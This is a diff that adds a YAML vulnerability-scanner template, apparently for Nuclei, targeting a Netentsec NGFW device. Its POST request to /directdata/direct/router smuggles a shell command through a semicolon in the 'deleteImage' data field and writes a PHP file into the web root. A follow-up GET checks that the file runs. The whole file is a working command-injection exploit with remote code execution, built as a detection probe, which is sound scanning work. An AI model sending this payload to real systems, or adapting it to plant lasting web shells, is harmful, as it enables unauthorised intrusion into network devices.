@@ -1,0 +1,39 @@
+id: poc-yaml-netentsec-ngfw-rce
+
+info:
+  name: poc-yaml-netentsec-ngfw-rce
+  author: YekkoY
+  severity: medium
+  tags: xray-converted,rce,ct-194295
+  reference:
+    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+
+http:
+  - raw:
+      - |
+        POST /directdata/direct/router HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '<?php echo md5({{rand_base(8)}});unlink(__FILE__);?>' >/var/www/html/{{rand_base(8)}}.php"]}],"type":"rpc","tid":17}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SSLVPN_Resource"
+  - raw:
+      - |
+        GET /{{rand_base(8)}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
